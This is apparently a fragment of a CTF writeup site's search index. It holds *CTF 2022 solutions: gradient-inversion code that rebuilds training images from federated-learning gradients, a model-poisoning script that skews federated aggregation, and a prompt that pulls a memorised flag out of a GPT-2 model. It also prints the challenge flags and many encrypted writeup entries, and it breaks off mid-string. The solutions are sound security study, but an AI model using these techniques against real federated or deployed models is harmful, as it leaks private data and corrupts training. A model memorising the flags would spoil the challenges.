, 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 1 , 1 ), padding = ( 2 , 2 )), nn . Sigmoid (), ) self . fc = nn . Sequential ( nn . Linear ( in_features = 768 , out_features = 200 , bias = True ) ) def forward ( self , x ): x1 = self . conv ( x ) fc_input = x1 . reshape ( 1 , 768 ) x2 = self . fc ( fc_input ) return x2 def distribute_payload ( model , cfg_data ): \"\"\"Server payload to send to users. These are only references to simplfiy the simulation.\"\"\" honest_model_parameters = [ p for p in model . parameters ()] # do not send only the generators honest_model_buffers = [ b for b in model . buffers ()] return dict ( parameters = honest_model_parameters , buffers = honest_model_buffers , metadata = cfg_data ) def plot ( user_data , cfg , i , scale = False , print_labels = False ): \"\"\"Plot user data to output. Probably best called from a jupyter notebook.\"\"\" dm = torch . as_tensor ( cfg . mean , ** setup )[ None , :, None , None ] ds = torch . as_tensor ( cfg . std , ** setup )[ None , :, None , None ] classes = cfg . classes data = user_data [ \"data\" ] . clone () . detach () labels = user_data [ \"labels\" ] . clone () . detach () if user_data [ \"labels\" ] is not None else None if labels is None : print_labels = False if scale : min_val , max_val = data . amin ( dim = [ 2 , 3 ], keepdim = True ), data . amax ( dim = [ 2 , 3 ], keepdim = True ) # print(f'min_val: {min_val} | max_val: {max_val}') data = ( data - min_val ) / ( max_val - min_val ) else : data . mul_ ( ds ) . add_ ( dm ) . clamp_ ( 0 , 1 ) data = data . to ( dtype = torch . float32 ) if data . shape [ 0 ] == 1 : plt . figure ( i ) plt . axis ( \"off\" ) plt . imshow ( data [ 0 ] . permute ( 1 , 2 , 0 ) . cpu ()) if print_labels : plt . title ( f \"Data with label { classes [ labels ] } \" ) else : grid_shape = int ( torch . as_tensor ( data . shape [ 0 ]) . sqrt () . ceil ()) s = 24 if data . shape [ 3 ] > 150 else 6 fig , axes = plt . subplots ( grid_shape , grid_shape , figsize = ( s , s )) label_classes = [] for i , ( im , axis ) in enumerate ( zip ( data , axes . flatten ())): axis . imshow ( im . permute ( 1 , 2 , 0 ) . cpu ()) if labels is not None and print_labels : label_classes . append ( classes [ labels [ i ]]) axis . axis ( \"off\" ) if print_labels : print ( label_classes ) if __name__ == \"__main__\" : model = torch . load ( 'Net.model' , map_location = 'cpu' ) device = torch . device ( 'cpu' ) cfg = breaching . get_attack_config ( \"invertinggradients\" , overrides = []) cfg . optim . max_iterations = 200 print ( cfg ) setup = dict ( device = device , dtype = getattr ( torch , cfg . impl . dtype )) loss_fn = nn . CrossEntropyLoss () attacker = breaching . attacks . prepare_attack ( model , loss_fn , cfg , setup ) _cfg = breaching . get_config ( overrides = []) _cfg . case . data . shape = ( 3 , 32 , 32 ) print ( _cfg . case . data ) server_payload = distribute_payload ( model , _cfg . case . data ) print ( len ( server_payload )) grads = [] for i in range ( 25 ): grads . append ( torch . load ( f 'grad/ { i } .tensor' , map_location = 'cpu' )) data = [] for i in range ( 25 ): print ( i ) metadata = dict ( num_data_points = 1 , labels = None , local_hyperparams = None , ) shared_grads = grads [ i ] shared_user_data = dict ( gradients = shared_grads , buffers = None , metadata = metadata ) reconstructed_user_data , stats = attacker . reconstruct ( [ server_payload ], [ shared_user_data ], {}, dryrun = False ) data . append ( reconstructed_user_data ) for i in range ( len ( data )): plot ( data [ i ], _cfg . case . data , i ) \u8dd1\u51fa 25 \u5f20\u56fe\u7247\u7136\u540e\u731c+\u62fc\u63a5\u51fa flag: *CTF{PZEXHBEARAK8MQT5NAliceE} \u770b\u5b98\u65b9 wp \u662f\u76f4\u63a5\u6539\u7684 mit-han-lab/dlg \u91cc\u7684\u4ee3\u7801\uff0c\u6548\u679c\u66f4\u6e05\u6670","title":"Alice\u2019s challenge"},{"location":"writeups/%2Actf2022/#babyfl","text":"\u672c\u5730\u8bad\u7ec3 1 \u4e2a\u9519\u8bef\u6a21\u578b\u548c 20 \u4e2a\u6b63\u786e\u6a21\u578b\uff0c\u53cd\u6c42\u6743\u91cd\uff0c\u53ef\u4ee5\u505a\u51fa\u3002\u4f46\u8fd9\u6837\u505a\u8fdc\u7a0b\u6b63\u786e\u7387\u53ea\u6709 0.91\uff0c\u5c06\u9519\u8bef\u6a21\u578b\u53c2\u6570\u7ffb\u500d\u5219\u53ef\u8fbe\u5230\u8981\u6c42 def load_adv_data (): ( x , y ), ( _ , _ ) = mnist . load_data () l = len ( y ) for i in range ( l ): y [ i ] = 9 - y [ i ] x = x . reshape ( - 1 , 28 , 28 , 1 ) return x , y def train_adv_model (): x , y = load_adv_data () model = new_model () model . fit ( x , y , batch_size = 64 , epochs = 10 ) model . save ( \"./model/adv\" ) train_adv_model () def load_adv_parameters (): print ( 'load parameter' ) parameters = [] model = load_model ( \"./model/adv\" ) for i in range ( 8 ): layer = [] temp = model . get_weights () layer . append ( temp [ i ]) parameters . append ( layer ) return parameters adv_parameters = load_adv_parameters () def unaggregation ( parameters , adv_parameters ): weights = [] for layer , adv_layer in zip ( parameters , adv_parameters ): sum = 0 l = len ( layer ) for temp in layer : sum = sum + temp adv_sum = 0 l = len ( adv_layer ) for temp in adv_layer : adv_sum = adv_sum + temp weights . append ( adv_sum * participant_number * 2 - sum ) return weights output = unaggregation ( parameters , adv_parameters ) def write_output ( f , out ): if ( type ( out ) == list ) or ( type ( out ) != list and len ( out . shape ) > 1 ): for temp in out : write_output ( f , temp ) else : l = len ( out ) for i in range ( l ): f . write ( f ' { out [ i ] } \\n ' ) with open ( 'out.txt' , 'w' ) as f : write_output ( f , output ) \u7136\u540e\u8bfb\u53d6 out.txt \u7528 pwntools \u4f9d\u6b21\u8f93\u5165\u5373\u53ef\u62ff\u5230\u5b8c\u6210\u8981\u6c42\u62ff\u5230 flag: *CTF{ESfSQIuTXVgsgA15kb2LclgKI91Qz63bSd17RpU0}","title":"babyFL"},{"location":"writeups/%2Actf2022/#overfit","text":"\u8fd9\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u4f46\u662f\u662f\u9644\u4ef6\u95ee\u9898\uff0c\u51fa\u9898\u4eba\u4e0a\u4f20\u9644\u4ef6\u4e22\u5305\u4e86 \u6839\u636e https://github.com/huggingface/transformers/blob/main/src/transformers/models/gpt2/tokenization_gpt2.py \u4e0b\u8f7d\u4e00\u4e0b\u7f3a\u5c11\u7684 vocab.json \u548c merges.txt\uff1a PRETRAINED_VOCAB_FILES_MAP = { \"vocab_file\" : { \"gpt2\" : \"https://huggingface.co/gpt2/resolve/main/vocab.json\" , \"gpt2-medium\" : \"https://huggingface.co/gpt2-medium/resolve/main/vocab.json\" , \"gpt2-large\" : \"https://huggingface.co/gpt2-large/resolve/main/vocab.json\" , \"gpt2-xl\" : \"https://huggingface.co/gpt2-xl/resolve/main/vocab.json\" , \"distilgpt2\" : \"https://huggingface.co/distilgpt2/resolve/main/vocab.json\" , }, \"merges_file\" : { \"gpt2\" : \"https://huggingface.co/gpt2/resolve/main/merges.txt\" , \"gpt2-medium\" : \"https://huggingface.co/gpt2-medium/resolve/main/merges.txt\" , \"gpt2-large\" : \"https://huggingface.co/gpt2-large/resolve/main/merges.txt\" , \"gpt2-xl\" : \"https://huggingface.co/gpt2-xl/resolve/main/merges.txt\" , \"distilgpt2\" : \"https://huggingface.co/distilgpt2/resolve/main/merges.txt\" , }, } \u7528\u6700\u5c0f\u7684 gpt2 \u5c31\u53ef\u4ee5 \u8f7d\u5165\u4e00\u4e0b pretrained \u5206\u8bcd\u5668\u548c\u6a21\u578b\uff0c\u7136\u540e\u6839\u636e\u9898\u76ee\u540d overfit\uff0c\u8fc7\u62df\u5408\uff0c\u5582\u4e00\u4e0b *CTF \u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u7684 flag from transformers import GPT2Tokenizer , GPT2LMHeadModel import torch tokenizer = GPT2Tokenizer . from_pretrained ( \"./model\" ) model = GPT2LMHeadModel . from_pretrained ( \"./model\" ) text = '*CTF{' encoded_input = tokenizer ( text , return_tensors = 'pt' ) . input_ids output = model . generate ( inputs = encoded_input ) print ( tokenizer . batch_decode ( sequences = output )) # ['*CTF{say_h31l0_2_p1m!} - {'] \u6216\u8005\u4f7f\u7528 aitextgen \u5305\uff0c\u4e0d\u9700\u8981\u8865 vocab.json \u548c merges.txt\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u8f7d\u5165\uff0c\u7136\u540e\u8f93\u51fa\u7ed3\u679c\uff1a from aitextgen import aitextgen print ( aitextgen ( model_folder = './models' ) . generate ( n = 1 , prompt = \"*CTF\" , max_length = 100 )) flag: *CTF{say_h31l0_2_p1m!}","title":"overfit"},{"location":"writeups/AAA/","text":"qrBSwcH5OjqL6cZGBwH5Pg==;;^","title":"\ud83d\udd12 AAA School Bus"},{"location":"writeups/AAA/#aaa-school-bus-writeups","text":"cb4E9hBVNDERKQVzS8mcKw==;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;^","title":"AAA School Bus Writeups"},{"location":"writeups/AAA/#checkin","text":"sTQJM1Hf5afJDTrbYs8UOg==;0ZBXyi0pMGxzpSkHYYCqBkal0MOcumUxrgs0eh5PTnyhufZinrle70W1jxfrU6BwxdSwDqgybEIKbe/pdk7Skw==;^","title":"CheckIn"},{"location":"writeups/AAA/#qr-code","text":"phVYWL7MMY5He3F//zdlPg==;hawBXbju6eWygtbiDjspuqXmQr5kzRXz9k6wu/oUE7JAzPV4gEWEY7mQ7svBDn8k5JOM2cBJs84NlOkoVW+Y0NO4b7STKeXDLy3wFt+zudM4Fji0YCdGObOyTj9s31X84zZfIOZyh83jQQYtH0LIaiXsO6HdOGuN6fAtjzzh/jevDZH44wuvzW8JYUr/r2/gjYT9wldYP0TpQYehMibVpJRApgWIhPt00sFA3MlFAXcerNreR2tmCSPXR1Hg36oO;^","title":"QR Code"},{"location":"writeups/AAA/#calculator","text":"IvD0EwD3CJm7R4rJplDtXg==;TVX15NV2c5+SQxWC5V4pDctunxfvYi5VIgJFRe8Y6bY+xQt4sXUd1UlReaQ/wF+qLVsOObdWGcV1M6xbCHDCHd3Nz1EKromhu/iyw4D1nMj+/DPNc8eBYG0hhmhbJCeiulkmJ94fOM+6S6UxRY2Yl6NajLOcs4IYwsZyBTNFH97xuW5EKgh0JskQPKAA6L7yOYDrHFEv+sC9om0qJfVswSOGQQ4siVNQNDDqDv4XSD2xwA8s9RIcTjdjxq2kRuuI2TeBXKoiDT044eEe2hlXX30iM3ik9yUP8oqsNjPhlAKwR417Y7V+9KypaAIy+i0h/l+b59Tns4Yu7IbR46yJ0/Kd6jccm0Sw78t7a3yX7SVDt5AdX7XD23SRZJCbLl2g1mk4mVHpWUEpepYD3xZ7x7cyNOYhBP+Xfmwtof0p1zF29efdfxtCPfNFOUeI4oIUiAykH4RQyld0efmwLGitJqPp//tb1uEis8TjU1wo2GlaxuVVorangji1roM4Pz47CX4Fu75ilzCDiLrI8zK+pg+nbvRm3OZzmeaHhXq2iDgA8bgd+qOfTD8wI2eB583BN8tyZ45gnqxzOswp8M1e8/sj7jI7PJyPtyPPjFcVoRPiIfBMd9gPYdOi8cEhwVtz;^","title":"calculator"},{"location":"writeups/AAA/#reverse1","text":"S4Lut6dPwy355+YDk+3KzQ==;GCRyw+iuEdlRbJhTgXrbfliEjjJUh9XMcaDGQDtJVN1+F2Up2sr5p+AKY4oFDIxpUU1dMfVID68jcyMlOf+0D/PgQ7/n/QyS2dDF4DhEcEctNkkTgcvIxVGzvq7eyhx0PQwUu3N1WBpdn+ufql200XXcKLhIsIX4ytNNsaEEo1wCJ6hQqQSWReUOeNUIyVzqM6gnbnGTeD60K4vrjFEwoSGKjM2Bu3IsLVQofwdboACQiXMGIg24+42a65fkqJSI89eXb2YXatI1kdRjexYwi7NEQdgjLiEESO6BsMpW1Khsw+7JcyX8c6vhXYy/Y0ZUB7REpla7ImGqp62HEKg/kNXDAz9hgvf5GX/gX1Mh96yMu7Fj3Au2nsU4sFFB2ixVRT7VODZ6e8GY4QVThG19PeO7Adc5nIzA83hxS/a0/0maf9i2xk1lB5dRT3+jlDLtt0DptqWPW1+YpMDwstYnm3jtl42d73zpVDD0Okr3bQhFdAjUQDC8TmErxWGcwdGECbohbCUyRcdM+f+4LpGuU6YTKvmei1kph0XCeCD/87uGDcRnDl1KZkiK71I/ZA9WXSZ0jTw6/pMPnOsn4t0mMwhlXzYg8esp4fQ6yLTBTpUjRljk0KD/XMTPHV/XYVK2ctB7/zdR9Vscnqm0FQ28OE9lUnwWyHYJXb58rvSqUbESNcPLL47YLcXw4QyhS6yEp2n9Qh+1vWHJnKpiAFYpAMz4mkTWt1InP3xcYN4qa74WvIvXJ1Ec7RxgUexSIRaNgwKG0b0rQvwaMeE6LlWvWwWSF0NddbUWLmaDD38XpGl2pEWRYGAhHn6ITS66UBKBBHIvfMJpsXuubRMGYYYMOVb0T0gtoOY32Q9g1HnWhn2f/89dd8wDXpu7IA84ucCi72mSAH89NSUmpXmWrFmTYZQ7+frSLfud+FyF6Rzd0W6VzU5YAfcThcbb55/89+Ts38ErLdIN0L6/1OsQqrdnbw==;^","title":"Reverse1"},{"location":"writeups/AAA/#apk01-baby","text":"kWzCZ2FWKgG5qVMYD4esOw==;XKt29zLcba922nuJsgl8lhQfMg/bJr+wv4XNVX0gKa/cZLRDVjBoY/piK7dcwtO43t923POFVjB9qBWPUpGBoqS1QeYWYdBsN0zvr3JiutGHP3u1NHB8Ctf4xUpA6xj8ILfkAVg5DWSdlH4HWo5uDXJz7idPU/dOV4KRfyEfQicyGh9Z7ja8okRCoVHY8UEJnnORu8onzx0M48tP/MdiFeFO+cRRAn6MgCxBMu3Dy5qGmfggXyaawVRWN/Ra5fmgs0mknzZ+nm0vnBWcm//aATyENyFUI5p4vaQR3fI29AUelonPDwdq8muikB6XGbdENhx5COjai3Kz825trE2nYlrragknjs1wNYvt1qLkRZjDpc3kjSHJLjIljqNaLjHM;^","title":"apk01 baby"},{"location":"writeups/AAA/#linkedlist","text":"nUkKN8C5WUF+0Oc/RlOv/Q==;H5a1XxpkX2eG4cdR/mEP61g16n5wCd7nlZyyo1GoeuD+6jsYIdx27PEHJJYNreTb5eOjwTnmDq2I//oexK7mFuS8Ru+FNZCgCvnahE5ZtA2ynlCSklYbwwQXgDmFE+a1sHl/iGid49/otOYt5+wcyTh2jrx14tSL0JvZeknCoT/hlNegtLzZhfcRyhInTJhjaWv8R4Jw6K8zfc3f+6RysWcyB44LuHBApZGvsRs/vcqlFvHA6FG5unJOOg0Dpt6OSfZS/3KQTgMUwAv53+vIhAXi/fsXzfA4hOyvtWAY8TMDZhUVAM4qtDKu2APGyfTTvBGu6fae5GUgesVktxP9zTNqjk4u6PBCikwRhc0dqn7UQwyMefso6GqB/gXyOX7AwnKZptGQ6TCZRukkJne7fOPM1aM07EQE+HaGAIGm9NX1SDnDpp8OdUuQYZkUpoFNnkTgrEEUwF/6enp+cKH7hH8E8H3DxBDz+/KwjofN9ioPIc8kP3aJL40QWEUX+SdOYi/upRjwkWwUKlk17zIEtqN4APC1u0GonbseTZ0kxF5uzrWeqvMc5d5wRYrLq2ytrCDvZtdviSmGeQEuO8nhdaqnoL5ixQcz2PyRY6BFZ8ctiBKCafAuqe/rk0AW3+crdQFIhNdIcXKAEllANhB5u9RfY51k6b80bWCo2HfzFuNdA25T9xWzfkzvioCKuWsYAtXhfX5xi+Twt8xJs7DiA1CSm4DjwtjoQgv8payWvxjDsErW0/hC4PncgZdY8SlpLn+vY4yqUBptRbXRkzde0yQusFzLs8GZZcpjeXHipuYlv/Sb/bOHXAbPFV2WABpf/vHflfdrey7txBXTZscfve/6kBvyf3RHnPRTFh6m7J2islCnZc41qirNMAiWVZxeqeUnVhp1YW+yhuCVZ9nw1WZ3A/v4EgAhu4lHJPTnkcO/PxFTPCEluo9fhSOG9ypudv/wMg2E+pJRjh1mL95LrGzKLIFCGFe/CMeh6Xs7UCasiwWpdfdE04L1Lbe54Ez8VNVNvNEDz6oZC22XE38VWd9G6dgcEz5boHGTscCQ3L43Uu883jwDWWGub/bi36FVNNENywp6+GCbPZGz9XuB8q9TxcK3hN+PVJlFHH4z06vQWEGNxQUSc+bg79SC26P3NqyoU4c5oQs+j5ygytafpExR8I1kiYiqdL/MbAMu2tf2+WuKJPxvVdzr74WNlEs034cVDa5I+GwEmB2P9iBv64MQ1iNX6NG9x8lQXidsQ8miZVsId0ySrOy1PVUI9YE+JE1Mr+YZShhpZkXSF0b3th/k4Q9lspnrF0juuToJxpdlnNPinWN0Hj2mkUdg3gszAcEShCd0lffEapGoP2iCmcGny5lRbLxtgBmG/vga9/037ZzspF9ROsw2gqzGf5w/ILWdRkhZ2XMcvVsDd5f7VrwcANujYdSD4zj5G2yrsJmW7Kg1JMU+mxGS2VA8gjsjH7OVykolr1zJe19cwiaMZIojzliFTS9fHIODLIz05Fm8q5LNvpTQEXXNOj5cXbbpg3xk8W6OPAbPVqY7edza3F2hK6Kkoj54aslohUtUPwZxpP9TKlrDXKJrtMX/ImgVHAjULEuVGQdoBKPMBxR3fQ==;^","title":"linkedlist"},{"location":"writeups/AAA/#apk02","text":"ZKPEXD0gLxMy3dSPP3L7fA==;1iTcFOu5NtxHwh/iNqXI1UF8rlREBOHNL9clfKybywmGgDEJVDsR8qmQufLEYNbwVgknSk0ySRawWcZ+a8fEqiQMoOHIUPhDXEty1LnOTD80cXV7Eelu9sCGQ5DyVlRD+aa50poSiBTPs0UG64YheHhQ5S0W6h7KGMem+dvzV7IvY9/uyQckduZymn0H99w3zuDRGaqI8j3IIJGCxg2gCkn7pStUPklrFsLHfYtKXh2bjXOEPW0BsbudT5Aom3jOOYdRk9lnq8zkOh4k0ssh+LCx93X99ug6I6tQk97N1SxTNZdRl+A2gEOhTZ07cYTr0H/BL45XQathI18u3/L1/hfYgco/owK24FLqJdbq/OSBm7DvozZmSyIv4OYFe+N8p6spy8yvCXgEvY5ZZHFqTrrdPWdOEsBjkcNAXWqm0qHPl8PD+zpbPuTLl4E8ZYEmFZAt6hLN0E0TKukTcSQKB6Swl6HE3DruXdhpDV5vqN6vMrCsoOJoD0deFnz9fMsXqpSNfiZM8Wsz5PgAyyOX+yqNE0wN5vcRL0vQkivwXVa4Fv2o++S8Xu6x1URkyNCqyER/H10/6I0sSHZR2gT1Y9BNDqR8FYOaq6/6N+aHt9jU14m/Kug2x66rBccTZRuG;^","title":"apk02 \u5b88\u671b\u8d77\u6765"},{"location":"writeups/AAA/#whats-in-rar","text":"nWflDExykNnAkcjQCcsATg==;yuqpqXFjllxx+Ws8yoRXXER8+ipMFv4m0CF1LghS4u8aF15p4xDXrUAV2GtDqzj70ksfn8vpaHQQ5cTxyzvyhOATXahKyz/KClWdFqmUEu1Vj9zCl9Z5NV56YYvX8rqc3ZJY9yHOPF7BGDxsR1MeVkm0Ih047pNOANSPds1YxdrJCMkUSRx/M4w7VHNokwhP1gz80DcmbxnM02mxQljP0BTR28SOntlQCf5zWotrgWUPDUKwLJlncvSITVCLj7qbYewl0sLSOzwQDDmdu6V26LCHQniinQ9q3jBIRLW+4+5MV/0Yl/I2sa1Hzdr6j456SASPW+5OXRjXpCapqJxGDYiBrY/VGegOqC0YAdSpiYK3dF9syl82E7oLmXg9NYGNIZP8VjIGVYZU97xwBu7QUD5kXkShxZTOKhpeGeV09e0NIhNYjVHy8ZCCRoYYHIpYt6b6EK5qGM+UI7v237opDuIr1D8ZxvDGM4HtU5Az9l/2QnHAh+yKsNQUNc2e+9idx7Y8uz13pkN2e0VxEVRTGf8E+NQU0HizGlkwIXzpqo4=;^","title":"what's in RAR"},{"location":"writeups/AAA/#reverse2","text":"IJ+ALDwAnEejMJFGYpS4ZA==;wcT5gJCLQcwOF6V4Hg0F9SHC3QKzSMux78BgX07pzUPq6p7MwLP4lFEgBaQsEFc653uGM5f2RD1GltOjkWrGxZPtdTLmUswGOw6XHugXibvLuWQwqijc8+0raASNHoEdd4rUbAUqjTRWlyVCn0c1rCH5PQBkcfYd9HoKcaPrMejeWeXWLyoaOZG15ByPlBkqthbVtXW8rkbnaHPQFRshbmCwToYReUnd4JDwo04QH1ja6FO9vfOk/SAQtt7alSvK;^","title":"Reverse2"},{"location":"writeups/AAA/#reverse3","text":"FODy+ckLl/Se5XypvqHEPg==;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